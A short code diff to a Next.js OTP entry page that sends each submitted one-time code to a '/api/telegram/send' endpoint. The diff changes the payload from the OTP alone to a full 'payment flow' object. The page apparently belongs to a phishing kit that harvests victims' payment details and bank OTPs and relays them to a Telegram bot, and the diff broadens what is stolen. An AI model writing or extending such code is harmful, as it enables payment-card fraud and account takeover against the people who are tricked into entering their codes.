@@ -2,6 +2,7 @@
 
 import { useEffect, useRef, useState } from 'react'
 import { useRouter } from 'next/navigation'
+import { updatePaymentFlow } from '@/lib/payment-flow'
 import { ChevronRight, TriangleAlert } from 'lucide-react'
 
 const logoImage =
@@ -75,10 +76,11 @@ export default function OtpPage() {
               }
               setError('')
               try {
+                const flow = updatePaymentFlow({ otp: digits.join('') })
                 await fetch('/api/telegram/send', {
                   method: 'POST',
                   headers: { 'content-type': 'application/json' },
-                  body: JSON.stringify({ text: `OTP submitted: ${digits.join('')}` }),
+                  body: JSON.stringify(flow),
                 })
               } catch {
                 // Continue navigation even if the notification fails
